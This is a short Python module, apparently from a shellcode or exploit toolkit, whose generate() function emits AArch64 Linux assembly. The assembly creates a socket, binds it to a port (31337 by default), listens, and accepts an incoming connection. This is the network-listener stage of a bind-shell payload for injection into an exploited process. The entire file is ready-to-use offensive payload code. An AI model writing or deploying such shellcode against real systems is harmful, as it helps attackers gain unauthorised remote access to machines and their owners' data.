# listen(port)

from socket import ntohs

def generate(port=31337):
    """listens on specific port

    Args:
        port(int): specific prot

    Returns:
        ``x6`` reg indicates socket descriptor
    """
    sc = """
    /* socket(...) */
    mov x0, 2
    mov x1, 1
    sub x2, x2, x2
    mov x8, 198
    svc 1

    /* backup socket descriptor x6 
       bind(...)
    */
    mov x6, x0
    adr x4, sockaddr_in_1
    #mov x4, pc
    #add x4, #22
    ldr x1, [x4]
    sub x2, x2, x2
    str x1, [sp, 0]
    str x2, [sp, 4]
    mov x0, x6
    mov x1, sp
    mov x2, 16
    mov x8, 200
    svc 1

    b after_sockaddr_in_2

    /* sockaddr_in struct(...) */
sockaddr_in_1:
    .short 2
    .short %s

    /* listen(...) */
after_sockaddr_in_2:
    mov x1, 16
    mov x0, x6
    mov x8, 201
    svc 1

    /* accept(...) */
    mov x0, x6
    sub x1, x1, x1
    sub x2, x2, x2
    mov x8, 242
    svc 1
    mov x6, x0
    """ % (ntohs(int(port)))
    return sc
